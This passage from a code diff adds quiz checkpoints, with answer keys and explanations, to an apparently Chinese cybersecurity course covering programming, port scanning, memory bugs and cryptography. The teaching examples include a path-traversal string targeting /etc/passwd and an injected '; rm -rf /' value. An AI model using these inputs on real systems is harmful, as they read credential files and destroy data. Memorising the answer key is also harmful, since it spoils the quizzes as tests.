实战</button>\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(13)\">▶ 挑战：限时 CTF 模拟赛</button>";
+
+// ============================================================
+// Override existing SECTION_CHECKPOINTS with merged data
+SECTION_CHECKPOINTS_MERGED = {
+  "programming": [
+    {
+      "question": "在 Python 中，以下哪个类型最适合存储 IP 地址（如 \"192.168.1.1\"）？",
+      "options": [
+        "int",
+        "float",
+        "str",
+        "bool"
+      ],
+      "answer": 2,
+      "explanation": "IP 地址包含点号分隔的四段数字，是文本格式，应该用字符串（str）存储。虽然每段是数字，但 IP 地址作为整体不是数值类型。"
+    },
+    {
+      "question": "执行 int(\"80\") 和 int(\"abc\") 的结果分别是什么？",
+      "options": [
+        "都返回整数",
+        "第一个返回 80，第二个抛出 ValueError",
+        "第一个返回 80，第二个返回 0",
+        "都抛出异常"
+      ],
+      "answer": 1,
+      "explanation": "int() 可以将合法的数字字符串转为整数，但如果字符串不是合法数字格式，会抛出 ValueError。安全工具中必须用 try/except 处理这种情况。"
+    },
+    {
+      "question": "以下代码的输出是什么？\nport_services = {22: \"SSH\", 80: \"HTTP\"}\nprint(port_services.get(443, \"Unknown\"))",
+      "options": [
+        "None",
+        "报错 KeyError",
+        "Unknown",
+        "443"
+      ],
+      "answer": 2,
+      "explanation": "dict.get(key, default) 方法在键不存在时返回 default 值，而不是抛出异常。这是安全工具中处理可选数据的常用方式。"
+    },
+    {
+      "question": "为什么从网络接收的数据在做数学运算前必须转换类型？",
+      "options": [
+        "网络数据是加密的",
+        "网络数据永远是 bytes/str 类型",
+        "Python 不允许网络数据参与运算",
+        "转换类型可以加速运算"
+      ],
+      "answer": 1,
+      "explanation": "从 socket.recv() 或 HTTP 响应获取的数据是 bytes 类型，解码后是 str 类型。要作为端口号、状态码等数值使用，必须用 int() 转换。"
+    }
+  ],
+  "prog-01-02": [
+    {
+      "question": "以下 Python 代码中，check_vulnerability(\"Apache/2.4.49 (Ubuntu)\") 会返回什么？",
+      "options": [
+        "✅ 未发现已知漏洞特征",
+        "🔴 Apache 2.4.49 — CVE-2021-41773 路径穿越",
+        "无法识别",
+        "报错"
+      ],
+      "answer": 1,
+      "explanation": "函数中检查 banner.lower() 是否包含 \"apache/2.4.49\"，匹配后返回对应的 CVE 信息。条件分支从上到下匹配第一个符合条件的分支。"
+    },
+    {
+      "question": "为什么 def func(lst=[]) 是 Python 中的常见陷阱？",
+      "options": [
+        "语法错误",
+        "列表作为默认参数会在所有调用间共享",
+        "列表不能做默认参数",
+        "会导致内存泄漏"
+      ],
+      "answer": 1,
+      "explanation": "Python 的可变默认参数在函数定义时只创建一次。如果函数内修改了列表，后续调用会看到之前的修改。正确做法是用 lst=None，函数内 lst = lst or []。"
+    },
+    {
+      "question": "for port in [22, 80, 443] 循环会执行几次？",
+      "options": [
+        "1 次",
+        "2 次",
+        "3 次",
+        "无限次"
+      ],
+      "answer": 2,
+      "explanation": "for 循环会遍历列表中的每个元素，列表有 3 个元素，所以循环执行 3 次。"
+    }
+  ],
+  "prog-02": [
+    {
+      "question": "处理 GB 级日志文件时，以下哪种读取方式最安全？",
+      "options": [
+        "f.read() 一次性读入",
+        "f.readlines() 读入所有行",
+        "for line in f: 逐行处理",
+        "f.read(1000000) 每次读 1MB"
+      ],
+      "answer": 2,
+      "explanation": "逐行读取（for line in f）只保持当前行在内存中，内存使用恒定。一次性读取大文件会导致内存耗尽（OOM），这在安全工具中可能被利用为 DoS 攻击。"
+    },
+    {
+      "question": "以下代码中，如果文件不存在会发生什么？\ntry:\n    with open(path) as f: data = f.read()\nexcept FileNotFoundError:\n    data = \"default\"",
+      "options": [
+        "程序崩溃",
+        "data 被赋值为 \"default\"",
+        "data 为 None",
+        "无限重试"
+      ],
+      "answer": 1,
+      "explanation": "try/except 捕获了 FileNotFoundError 异常，执行 except 块中的代码，将 data 赋值为默认值。这是优雅降级（graceful degradation）的典型用法。"
+    },
+    {
+      "question": "路径穿越攻击中，攻击者通常使用什么来跳出预期目录？",
+      "options": [
+        "绝对路径",
+        "../ 序列",
+        "URL 编码",
+        "通配符 *"
+      ],
+      "answer": 1,
+      "explanation": "../ 表示上级目录。攻击者通过 ../../../etc/passwd 可以跳出应用目录，访问系统敏感文件。防御方法是用 Path.resolve() 后检查是否在基础目录内。"
+    }
+  ],
+  "prog-02-02": [
+    {
+      "question": "socket.AF_INET 和 socket.SOCK_STREAM 分别代表什么？",
+      "options": [
+        "IPv6 和 UDP",
+        "IPv4 和 TCP",
+        "IPv4 和 UDP",
+        "IPv6 和 TCP"
+      ],
+      "answer": 1,
+      "explanation": "AF_INET 表示 IPv4 地址族（AF_INET6 是 IPv6），SOCK_STREAM 表示 TCP（面向连接的流式传输），SOCK_DGRAM 表示 UDP。"
+    },
+    {
+      "question": "为什么端口扫描时必须设置 socket.settimeout()？",
+      "options": [
+        "加速扫描",
+        "防止程序在无响应时无限等待",
+        "减少网络流量",
+        "绕过防火墙"
+      ],
+      "answer": 1,
+      "explanation": "如果不设置超时，当目标端口被防火墙过滤（不返回任何响应）时，connect() 会等待很长时间（默认可能 75 秒以上）。设置短超时（如 2-3 秒）可以加快扫描速度。"
+    },
+    {
+      "question": "TCP 扫描和 UDP 扫描的主要区别是什么？",
+      "options": [
+        "TCP 更快",
+        "TCP 需要三次握手建立连接，UDP 无连接",
+        "UDP 更准确",
+        "TCP 只能扫描 Web 端口"
+      ],
+      "answer": 1,
+      "explanation": "TCP 是面向连接的协议，通过三次握手可以明确判断端口状态。UDP 是无连接的，很多服务不响应空包，导致超时无法区分\"开放\"和\"被过滤\"。"
+    }
+  ],
+  "prog-03": [
+    {
+      "question": "在 Linux 中，find / -perm -4000 -type f 这个命令的作用是什么？",
+      "options": [
+        "查找所有普通文件",
+        "查找 SUID 文件（可能的提权向量）",
+        "查找 4000 天前的文件",
+        "查找权限为 4000 的目录"
+      ],
+      "answer": 1,
+      "explanation": "-perm -4000 查找设置了 SUID 位的文件。这些文件以文件所有者的权限执行，如果被恶意利用可能导致权限提升。安全评估中这是标准检查项。"
+    },
+    {
+      "question": "grep \"Failed password\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn 这个管道链做了什么？",
+      "options": [
+        "统计失败登录的次数",
+        "找出 SSH 暴力破解攻击的 IP 并按频率排序",
+        "删除日志中的失败记录",
+        "统计所有登录用户"
+      ],
+      "answer": 1,
+      "explanation": "这个管道链：1) 筛选失败登录记录；2) 提取 IP 地址；3) 排序；4) 去重计数；5) 按次数倒序排列。这是检测暴力破解攻击的经典命令。"
+    },
+    {
+      "question": "Shell 脚本中 set -euo pipefail 的作用是什么？",
+      "options": [
+        "设置变量",
+        "让脚本在出错时立即退出，使用未定义变量时报错",
+        "设置管道模式",
+        "开启调试模式"
+      ],
+      "answer": 1,
+      "explanation": "-e 表示命令失败时退出，-u 表示使用未定义变量时报错，-o pipefail 表示管道中任一命令失败时退出。这三条是安全 Shell 编程的铁律。"
+    },
+    {
+      "question": "Shell 脚本中最严重的安全风险是什么？",
+      "options": [
+        "变量名太长",
+        "命令注入——用户输入被直接拼接到命令中",
+        "注释太多",
+        "使用 #!/bin/bash"
+      ],
+      "answer": 1,
+      "explanation": "如果用户输入包含 ; rm -rf / 这样的恶意内容，被直接拼接到命令中会导致灾难性后果。必须用引号包裹变量、验证输入格式。"
+    }
+  ],
+  "prog-04": [
+    {
+      "question": "C 语言中，int *ptr = &value 这条语句做了什么？",
+      "options": [
+        "把 value 的值赋给 ptr",
+        "把 value 的地址存入 ptr（ptr 成为指向 value 的指针）",
+        "创建一个新的整数",
+        "比较 ptr 和 value"
+      ],
+      "answer": 1,
+      "explanation": "& 是取地址运算符，&value 获取 value 的内存地址。int *ptr 声明一个指向 int 的指针，将 value 的地址存入 ptr。之后通过 *ptr 可以读写 value。"
+    },
+    {
+      "question": "为什么 strcpy(buffer, input) 是危险的？",
+      "options": [
+        "速度太慢",
+        "不检查目标缓冲区大小，可能导致缓冲区溢出",
+        "会加密数据",
+        "只支持 ASCII"
+      ],
+      "answer": 1,
+      "explanation": "strcpy 不检查目标缓冲区大小，如果 input 比 buffer 长，多余的数据会覆盖 buffer 后面的内存，可能覆盖函数返回地址导致代码执行。应使用 strncpy 并限制长度。"
+    },
+    {
+      "question": "程序内存布局中，栈（Stack）主要存储什么？",
+      "options": [
+        "全局变量",
+        "动态分配的数据（malloc）",
+        "局部变量、函数参数和返回地址",
+        "程序代码"
+      ],
+      "answer": 2,
+      "explanation": "栈存储局部变量、函数参数和返回地址。每次函数调用会创建一个栈帧。栈溢出攻击就是利用缓冲区溢出覆盖返回地址来劫持程序执行。"
+    }
+  ],
+  "prog-04-02": [
+    {
+      "question": "栈缓冲区溢出攻击的核心原理是什么？",
+      "options": [
+        "删除栈上的数据",
+        "向缓冲区写入超过其大小的数据，覆盖返回地址",
+        "增加栈的大小",
+        "加密栈上的数据"
+      ],
+      "answer": 1,
+      "explanation": "栈上的局部变量和返回地址相邻排列。向缓冲区写入超量数据会覆盖保存的 EBP 和返回地址，攻击者可以让返回地址指向恶意代码，实现任意代码执行。"
+    },
+    {
+      "question": "Use-After-Free 漏洞的最佳防御方式是什么？",
+      "options": [
+        "增加内存大小",
+        "释放内存后立即将指针置为 NULL",
+        "不使用动态内存",
+        "使用更长的变量名"
+      ],
+      "answer": 1,
+      "explanation": "释放后立即置 NULL 可以确保：1) 后续意外使用会立即触发段错误而非隐蔽漏洞；2) 防止攻击者通过新分配占据同一内存来劫持旧指针的行为。"
+    },
+    {
+      "question": "printf(user_input) 为什么是安全漏洞？",
+      "options": [
+        "printf 太慢",
+        "如果 user_input 包含 %x %n 等格式符，可以泄露或写入内存",
+        "printf 不支持中文",
+        "会导致内存泄漏"
+      ],
+      "answer": 1,
+      "explanation": "当用户输入被直接作为格式字符串时，%x 可以泄露栈上的值（信息泄露），%n 可以向任意地址写入数据（任意写入）。安全写法是 printf(\"%s\", user_input)。"
+    }
+  ],
+  "prog-05": [
+    {
+      "question": "在安全工具中，检查 IP 是否在黑名单中，用什么数据结构最快？",
+      "options": [
+        "列表（list）",
+        "集合（set）",
+        "元组（tuple）",
+        "字符串（str）"
+      ],
+      "answer": 1,
+      "explanation": "集合基于哈希表，查找时间复杂度 O(1)。列表需要逐个比较，时间复杂度 O(n)。在 10 万个 IP 的黑名单中，集合比列表快 100-1000 倍。"
+    },
+    {
+      "question": "两个集合的差集运算 scan2 - scan1 在安全分析中有什么用？",
+      "options": [
+        "计算总端口数",
+        "找出第二次扫描中新出现的端口",
+        "删除重复端口",
+        "排序端口"
+      ],
+      "answer": 1,
+      "explanation": "集合差集 A - B 返回在 A 中但不在 B 中的元素。scan2 - scan1 就是第二次扫描中新开放的端口，可能是新部署的服务或入侵者开的后门。"
+    },
+    {
+      "question": "collections.deque 相比 list 的优势是什么？",
+      "options": [
+        "占内存更少",
+        "两端的添加和删除都是 O(1)",
+        "支持排序",
+        "自动去重"
+      ],
+      "answer": 1,
+      "explanation": "list 在头部插入是 O(n)，deque 两端操作都是 O(1)。deque 还支持 maxlen 参数实现滑动窗口，非常适合日志监控场景。"
+    },
+    {
+      "question": "sorted(results, key=lambda x: x[\"risk\"], reverse=True) 做了什么？",
+      "options": [
+        "按 risk 字段升序排列",
+        "按 risk 字段降序排列（最高风险在前）",
+        "删除 risk 字段",
+        "随机排列"
+      ],
+      "answer": 1,
+      "explanation": "sorted 的 key 参数指定排序依据，reverse=True 表示降序。这样可以得到风险评分最高的结果排在前面，方便安全分析师优先处理。"
+    }
+  ],
+  "prog-05-02": [
+    {
+      "question": "在 10 万个元素的列表中查找一个值，列表查找和集合查找的时间复杂度分别是？",
+      "options": [
+        "都是 O(n)",
+        "列表 O(n)，集合 O(1)",
+        "列表 O(1)，集合 O(n)",
+        "都是 O(1)"
+      ],
+      "answer": 1,
+      "explanation": "列表需要逐个比较（O(n)），集合用哈希表直接定位（O(1)）。这就是为什么 IP 黑名单应该用集合而不是列表。"
+    },
+    {
+      "question": "以下哪个是 O(n²) 复杂度的典型场景？",
+      "options": [
+        "遍历列表",
+        "字典查找",
+        "双重循环比对每对元素",
+        "二分查找"
+      ],
+      "answer": 2,
+      "explanation": "双重嵌套循环对 n 个元素两两比较，总操作次数约为 n²/2。在安全工具中，比如比对每对 IP 之间的关联关系就是 O(n²)，数据量大时会非常慢。"
+    },
+    {
+      "question": "处理 GB 级日志文件时，为什么推荐用生成器（yield）而非列表？",
+      "options": [
+        "生成器更快",
+        "生成器惰性求值，每次只保持一条数据在内存中",
+        "列表不支持大文件",
+        "生成器自动排序"
+      ],
+      "answer": 1,
+      "explanation": "生成器每次只产出一个元素，内存使用恒定 O(1)。列表需要把所有元素加载到内存，GB 级文件会导致内存耗尽。"
+    }
+  ],
+  "prog-06": [
+    {
+      "question": "正则表达式 \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3} 匹配什么？",
+      "options": [
+        "邮箱地址",
+        "IP 地址格式（如 192.168.1.1）",
+        "URL",
+        "MAC 地址"
+      ],
+      "answer": 1,
+      "explanation": "\\d{1,3} 匹配 1-3 位数字，\\. 匹配点号，重复四次匹配 IPv4 格式。但注意这不验证每段是否 ≤255，需要更严格的正才能完全验证 IP。"
+    },
+    {
+      "question": "ReDoS（正则拒绝服务）攻击的原理是什么？",
+      "options": [
+        "发送大量请求",
+        "利用嵌套量词正则（如 (a+)+）在特定输入下导致指数级匹配时间",
+        "DDoS 攻击",
+        "SQL 注入"
+      ],
+      "answer": 1,
+      "explanation": "某些正则模式（嵌套量词、重叠分支）在特定输入下会产生指数级的回溯。攻击者构造恶意输入让 WAF 或应用的正则引擎长时间卡住，导致拒绝服务。"
+    },
+    {
+      "question": "re.search() 和 re.findall() 的区别是什么？",
+      "options": [
+        "没有区别",
+        "search 返回第一个匹配，findall 返回所有匹配",
+        "search 更快",
+        "findall 只匹配数字"
+      ],
+      "answer": 1,
+      "explanation": "re.search() 找到第一个匹配就返回 Match 对象，re.findall() 返回所有匹配结果的列表。在日志分析中通常用 findall 获取所有匹配项。"
+    }
+  ],
+  "prog-07": [
+    {
+      "question": "为什么端口扫描适合用并发编程？",
+      "options": [
+        "端口扫描需要大量 CPU 计算",
+        "端口扫描的主要瓶颈是等待网络响应，等待时 CPU 空闲",
+        "Python 不支持串行扫描",
+        "并发可以绕过防火墙"
+      ],
+      "answer": 1,
+      "explanation": "端口扫描是 I/O 密集型任务——大部分时间在等待网络连接或超时。并发允许在等待一个端口时同时扫描其他端口，大幅提升效率。"
+    },
+    {
+      "question": "ThreadPoolExecutor 的 max_workers 参数设置太大会有什么问题？",
+      "options": [
+        "扫描更慢",
+        "创建过多线程会耗尽系统资源（文件描述符、内存），可能被目标封禁",
+        "没有任何问题",
+        "会导致 Python 崩溃"
+      ],
+      "answer": 1,
+      "explanation": "每个线程占用内存和文件描述符。太多线程（如 10000+）可能耗尽系统资源。同时，对目标发送过多并发连接可能触发 IDS/IPS 或被防火墙封禁。"
+    },
+    {
+      "question": "asyncio 相比多线程的优势是什么？",
+      "options": [
+        "可以用更多 CPU 核心",
+        "单线程内管理数千并发连接，开销最小",
+        "语法更简单",
+        "不需要设置超时"
+      ],
+      "answer": 1,
+      "explanation": "asyncio 在单线程内通过事件循环管理大量并发 I/O 操作。每个协程只占几百字节（线程要几 MB），可以轻松处理数万并发连接，是大规模扫描的最佳方案。"
+    },
+    {
+      "question": "多线程编程中，为什么共享数据需要用锁（Lock）保护？",
+      "options": [
+        "加速运算",
+        "防止多个线程同时修改同一数据导致数据丢失或损坏",
+        "Python 要求必须用锁",
+        "锁可以加密数据"
+      ],
+      "answer": 1,
+      "explanation": "当两个线程同时执行 results[port] = \"open\" 时，可能出现一个线程的写入被另一个覆盖。锁确保同一时间只有一个线程访问共享数据，防止竞态条件。"
+    }
+  ],
+  "cryptography": [
+    {
+      "question": "凯撒密码使用偏移量 k=3 加密消息 'HELLO'，加密结果是什么？",
+      "options": [
+        "KHOOR",
+        "HELLO",
+        "KHOOR",
+        "EBIIL"
+      ],
+      "answer": 0,
+      "explanation": "凯撒密码将每个字母向后移动 k 位。H→K, E→H, L→O, L→O, O→R，所以 HELLO 加密为 KHOOR。偏移量 k=3 正是凯撒本人使用的经典参数。"
+    },
+    {
+      "question": "频率分析破解凯撒密码的原理是什么？",
+      "options": [
+        "尝试所有 26 种偏移量逐一比对",
+        "利用密文中字母频率分布与明文语言频率分布相同的特性，找出偏移量",
+        "分析密文中单词长度分布",
+        "利用密钥空间太小的弱点"
+      ],
+      "answer": 1,
+      "explanation": "凯撒密码只是将字母表整体平移，频率分布的形状完全不变。英语中 E 出现最多（约 12.7%），密文中出现最多的字母就对应 E，由此推算偏移量。暴力破解虽然也可行，但频率分析更优雅高效。"
+    },
+    {
+      "question": "单表替换密码的密钥空间为 26! ≈ 4×10^26，为什么仍然可以被频率分析破解？",
+      "options": [
+        "因为 26! 在计算机面前太小了",
+        "因为每个字母始终被替换为同一个密文字母，语言频率特征被完整保留",
+        "因为单表替换没有使用数学运算",
+        "因为密钥分发过程不安全"
+      ],
+      "answer": 1,
+      "explanation": "虽然密钥空间巨大使得暴力破解不可能，但单表替换的结构性弱点在于：每个明文字母始终映射到固定的密文字母。这意味着明文的字母频率统计特征被完整保留在密文中，频率分析可以直接利用。阿拉伯学者 Al-Kindi 在公元 9 世纪就发现了这一点。"
+    },
+    {
+      "question": "凯撒密码的数学表达式 C = (P + k) mod 26 中，mod 26 的作用是什么？",
+      "options": [
+        "增加密钥空间",
+        "让字母表循环，确保加密结果仍在 A-Z 范围内",
+        "提高加密速度",
+        "防止频率分析"
+      ],
+      "answer": 1,
+      "explanation": "mod 26 实现了字母表的'循环'效果。例如 Z（编号25）偏移 3 后为 28，28 mod 26 = 2，即字母 C。没有 mod 26，偏移后的值会超出字母表范围。"
+    },
+    {
+      "question": "ROT13 是凯撒密码的特例（k=13），它的特殊性质是什么？",
+      "options": [
+        "加密后无法解密",
+        "加密和解密使用相同的操作",
+        "密钥空间比凯撒密码更大",
+        "可以抵抗频率分析"
+      ],
+      "answer": 1,
+      "explanation": "英文字母共 26 个，13 恰好是 26 的一半。对任何文本做两次 ROT13（即偏移 13+13=26），等价于偏移 0，恢复原文。所以 ROT13 加密和解密是同一个操作。这不是安全特性，ROT13 没有任何密码学安全性。"
+    },
+    {
+      "question": "仿射密码 C = (a × P + b) mod 26 中，系数 a 必须满足什么条件？",
+      "options": [
+        "a 必须是偶数",
+        "a 必须大于 b",
+        "a 必须与 26 互素（gcd(a, 26) = 1）",
+        "a 必须是素数"
+      ],
+      "answer": 2,
+      "explanation": "a 必须与 26 互素，否则 a 在 mod 26 下没有模逆元。没有模逆元意味着无法唯一解密——多个不同的明文会映射到同一个密文。例如 a=2 时，P=0 和 P=13 都映射到 b，解密时无法区分。"
+    }
+  ],
+  "crypto-01-02": [
+    {
+      "question": "维吉尼亚密码相比凯撒密码的核心改进是什么？",
+      "options": [
+        "使用了更大的字母表",
+        "用关键词对明文不同位置使用不同的偏移量（多表替换）",
+        "增加了密钥长度",
+        "使用了数学运算替代字母替换"
+      ],
+      "answer": 1,
+      "explanation": "维吉尼亚密码的革命性在于'多表替换'——同一个字母在不同位置被加密成不同的密文字母。这使得传统的单字母频率分析完全失效，因为频率被分散到多个密文字母上。"
+    },
+    {
+      "question": "Kasiski 试验破解维吉尼亚密码的第一步是什么？",
+      "options": [
+        "直接暴力尝试所有关键词",
+        "找到密文中的重复片段，计算它们之间的距离，推测密钥长度",
+        "使用频率分析确定密钥字母",
+        "利用字母的 ASCII 编码"
+      ],
+      "answer": 1,
+      "explanation": "Kasiski 试验利用维吉尼亚密码的结构性弱点——密钥循环重复。当明文中出现重复片段且位置差是密钥长度的倍数时，密文中也会出现对应重复。通过分析这些重复片段距离的公因子，可以推测密钥长度。"
+    },
+    {
+      "question": "重合指数（IC）用于破解维吉尼亚密码时，英语文本的 IC 值约为多少？",
+      "options": [
+        "0.0385",
+        "0.0667",
+        "0.5000",
+        "1.0000"
+      ],
+      "answer": 1,
+      "explanation": "英语文本的重合指数约为 0.0667（两个随机选取的字母相同的概率），而完全随机文本的 IC 约为 0.0385。测试不同的密钥长度分组，选 IC 最接近 0.0667 的那个作为密钥长度。"
+    },
+    {
+      "question": "确定维吉尼亚密码的密钥长度后，如何破解每组的密钥字母？",
+      "options": [
+        "对每组密文做频率分析，最高频字母对应明文 E",
+        "对每组尝试暴力破解所有 26 种偏移",
+        "利用 Kasiski 试验继续深入",
+        "使用重合指数进一步细分"
+      ],
+      "answer": 0,
+      "explanation": "确定密钥长度 k 后，将密文按位置 mod k 分成 k 组。每组实际上是被同一个偏移量加密的凯撒密码。对每组做频率分析，找到最高频字母，推算它与 E 的偏移差，就得到了该位置的密钥字母。"
+    },
+    {
+      "question": "一次性密码本（OTP）为什么被称为'理论不可破解'的加密方案？",
+      "options": [
+        "因为它使用了复杂的数学",
+        "因为密钥与明文等长、完全随机、绝不重复，密文不泄露任何信息",
+        "因为密钥太长无法暴力破解",
+        "因为它使用了量子加密"
+      ],
+      "answer": 1,
+      "explanation": "OTP 的三个条件——密钥与明文等长、完全随机、绝不重复——使得每个密文字节可以等概率地对应任何明文。即使拥有无限计算能力，也无法区分哪个是'正确'的明文。但密钥分发问题使其无法大规模应用。"
+    },
+    {
+      "question": "维吉尼亚密码被破解的根本原因是什么？",
+      "options": [
+        "密钥太短",
+        "密钥循环重复使用",
+        "字母表太小",
+        "加密算法太简单"
+      ],
+      "answer": 1,
+      "explanation": "维吉尼亚密码的核心弱点是密钥循环重复。密钥长度有限，对长消息必须重复使用，这就产生了周期性模式。Kasiski 试验和重合指数法都利用了这一周期性。如果密钥不重复（一次性密码本），则理论不可破解。"
+    }
+  ],
+  "crypto-02": [
+    {
+      "question": "DES 的 S-Box 最初被怀疑有后门，后来发现 NSA 参与设计的真正目的是什么？",
+      "options": [
+        "植入后门让 NSA 能解密",
+        "增强加密速度",
+        "抵抗差分密码分析攻击——领先学术界 15 年",
+        "减小密钥长度"
+      ],
+      "answer": 2,
+      "explanation": "DES 的 S-Box 在发布时引发广泛怀疑，因为设计标准没有公开。后来发现 NSA 实际上增强了 S-Box 来抵抗差分密码分析（当时还是机密技术）。学术界直到 1990 年才独立发现差分分析方法，NSA 领先了约 15 年。"
+    },
+    {
+      "question": "DES 的 56 位密钥意味着多少种可能的密钥？它在何时被暴力破解？",
+      "options": [
+        "2^64 种，2010年被破解",
+        "2^56 种（约 7.2×10^16），1999 年在 22 小时内被破解",
+        "2^128 种，至今未被破解",
+        "2^32 种，1990年被破解"
+      ],
+      "answer": 1,
+      "explanation": "DES 使用 56 位有效密钥（64 位中 8 位用于奇偶校验），共 2^56 ≈ 7.2×10^16 种可能。1999 年 Deep Crack 硬件联合 distributed.net 的分布式计算在 22 小时内完成暴力破解，证明了 56 位密钥已不再安全。"
+    },
+    {
+      "question": "AES 每轮执行四个步骤的正确顺序是什么？",
+      "options": [
+        "AddRoundKey → MixColumns → ShiftRows → SubBytes",
+        "SubBytes → ShiftRows → MixColumns → AddRoundKey",
+        "ShiftRows → SubBytes → AddRoundKey → MixColumns",
+        "MixColumns → SubBytes → ShiftRows → AddRoundKey"
+      ],
+      "answer": 1,
+      "explanation": "AES 每轮四步：1) SubBytes（S-Box 非线性字节替换）→ 2) ShiftRows（行循环移位，实现行间扩散）→ 3) MixColumns（GF(2⁸) 有限域列混合，实现列内扩散）→ 4) AddRoundKey（异或轮密钥，注入密钥材料）。"
+    },
+    {
+      "question": "以下哪种 AES 工作模式被认为是最推荐的？为什么？",
+      "options": [
+        "ECB，因为最简单",
+        "CBC，因为广泛使用",
+        "GCM，因为同时提供加密和认证，且性能好",
+        "CTR，因为可以并行处理"
+      ],
+      "answer": 2,
+      "explanation": "GCM（Galois/Counter Mode）结合了 CTR 模式的并行性能和 GMAC 认证。它不需要 padding（避免 padding oracle 攻击），提供认证加密（AEAD），是目前 TLS 和其他协议中最推荐的模式。ECB 永远不应使用，CBC 容易受 padding oracle 攻击。"
+    },
+    {
+      "question": "为什么 ECB 模式被认为是不安全的？",
+      "options": [
+        "因为它太慢",
+        "因为相同的明文块总是产生相同的密文块，泄露数据的模式信息",
+        "因为它需要 IV",
+        "因为它只能加密短消息"
+      ],
+      "answer": 1,
+      "explanation": "ECB 模式对每个块独立加密，相同明文块必然产生相同密文块。著名的例子是加密一张企鹅图片，ECB 模式下仍然能看到企鹅的轮廓。这泄露了数据的结构和模式信息，违反了密码学的基本安全要求。"
+    },
+    {
+      "question": "对称加密面临的核心挑战是什么？这个问题由哪种加密方式解决？",
+      "options": [
+        "速度太慢；由硬件加速解决",
+        "密钥分发——通信双方必须安全地共享同一个密钥；由非对称加密解决",
+        "密钥太短；由更长密钥解决",
+        "算法太复杂；由简化算法解决"
+      ],
+      "answer": 1,
+      "explanation": "对称加密（如 AES）本身非常安全高效，但通信双方必须拥有相同的密钥。在开放互联网上，如何在不安全的通道中安全交换密钥是核心难题。非对称加密（如 RSA、DH）通过公钥/私钥机制解决了密钥分发问题。"
+    }
+  ],
+  "crypto-03": [
+    {
+      "question": "RSA 的安全性建立在什么数学难题之上？",
+      "options": [
+        "离散对数问题",
+        "大整数分解问题——将两个大素数的乘积分解回原始素数极其困难",
+        "椭圆曲线问题",
+        "哈希碰撞问题"
+      ],
+      "answer": 1,
+      "explanation": "RSA 的安全性基于大整数分解难题：两个大素数相乘非常容易（多项式时间），但将乘积分解回原始素数在计算上极其困难（目前没有已知的多项式时间算法）。RSA 的私钥 d 依赖于知道 p 和 q，所以分解 n 就等于破解 RSA。"
+    },
+    {
+      "question": "在 RSA 密钥生成中，欧拉函数 φ(n) = (p-1)(q-1) 的作用是什么？",
+      "options": [
+        "用于加密消息",
+        "用于计算私钥 d，使得 e×d ≡ 1 (mod φ(n))",
+        "用于生成随机数",
+        "用于验证签名"
+      ],
+      "answer": 1,
+      "explanation": "φ(n) 是 RSA 密钥生成的核心。选择公钥指数 e 后，私钥 d 是 e 模 φ(n) 的逆元，即 e×d ≡ 1 (mod φ(n))。这确保了加密和解密操作互为逆运算：m^(ed) ≡ m (mod n)，正确性由欧拉定理保证。"
+    },
+    {
+      "question": "RSA 中为什么必须使用 OAEP 填充，而不是直接加密？",
+      "options": [
+        "因为 OAEP 更快",
+        "因为直接加密是确定性的（同一明文总是产生相同密文），且小消息在小 e 下可被直接开方破解",
+        "因为 OAEP 能压缩消息",
+        "因为直接加密不支持大消息"
+      ],
+      "answer": 1,
+      "explanation": "RSA 直接加密（教科书 RSA）有两个严重问题：1) 确定性——同一明文总是产生相同密文，攻击者可以枚举验证；2) 小消息问题——当 m^e < n 时，密文 c = m^e，直接开 e 次方即可恢复明文。OAEP 引入随机性和结构化填充，解决这些问题。"
+    },
+    {
+      "question": "Diffie-Hellman 密钥交换中，Alice 和 Bob 如何在不安全的通道上协商出共享密钥？",
+      "options": [
+        "Alice 用 RSA 加密密钥发送给 Bob",
+        "双方各自生成临时密钥对，交换公钥后通过 g^(ab) mod p 计算共享秘密",
+        "通过一个可信第三方分发密钥",
+        "使用对称加密传输密钥"
+      ],
+      "answer": 1,
+      "explanation": "DH 的精妙之处在于：Alice 计算 A=g^a mod p，Bob 计算 B=g^b mod p，双方交换 A 和 B（公开信息）。Alice 计算 B^a = g^(ab) mod p，Bob 计算 A^b = g^(ab) mod p，得到相同的共享密钥。窃听者知道 g、p、A、B，但无法计算 g^(ab)（离散对数难题）。"
+    },
+    {
+      "question": "RSA 的实际应用中，为什么不用 RSA 直接加密所有数据？",
+      "options": [
+        "因为 RSA 密钥太短",
+        "因为 RSA 比 AES 慢约 1000 倍，实际只用于密钥交换和数字签名",
+        "因为 RSA 不能加密大文件",
+        "因为 RSA 的密文太长"
+      ],
+      "answer": 1,
+      "explanation": "RSA 的数学运算（模幂运算）非常耗时，比 AES 慢约 1000 倍。实际应用中，RSA 用于：1) 协商对称密钥（如 TLS 握手）；2) 数字签名。然后用快速的 AES 加密实际数据。这种混合方案结合了两者的优势。"
+    },
+    {
+      "question": "目前推荐的 RSA 密钥长度是多少？为什么 512 位不再安全？",
+      "options": [
+        "512 位足够，至今安全",
+        "推荐 2048 位或更高；512 位在 1999 年就被成功分解",
+        "128 位即可",
+        "4096 位以上才行"
+      ],
+      "answer": 1,
+      "explanation": "RSA-512 在 1999 年被成功分解，RSA-768 在 2009 年被分解。目前推荐至少 2048 位（安全到约 2030 年），高安全需求使用 3072 或 4096 位。量子计算机成熟后，所有 RSA 密钥都不安全，需要迁移到后量子算法。"
+    }
+  ],
+  "crypto-03-02": [
+    {
+      "question": "RSA 共模攻击（Common Modulus Attack）的前提条件是什么？",
+      "options": [
+        "两个不同的消息用同一密钥加密",
+        "同一消息用相同的模数 n 但不同的公钥指数 e 加密两次",
+        "两个用户共享相同的私钥",
+        "模数 n 太小"
+      ],
+      "answer": 1,
+      "explanation": "共模攻击的条件：同一明文 m 用相同的 n 但不同的 e₁ 和 e₂ 加密，产生密文 c₁ 和 c₂。通过扩展欧几里得算法找到 s、t 使得 s·e₁ + t·e₂ = 1，然后计算 c₁^s × c₂^t mod n = m。防御方法：不要对同一消息使用相同 n 的不同 e 加密。"
+    },
+    {
+      "question": "Hastad 广播攻击利用了 RSA 的什么弱点？",
+      "options": [
+        "密钥太短",
+        "同一消息用小公钥指数 e（如 e=3）发给多个接收者，用中国剩余定理恢复明文",
+        "私钥 d 太小",
+        "填充方式不安全"
+      ],
+      "answer": 1,
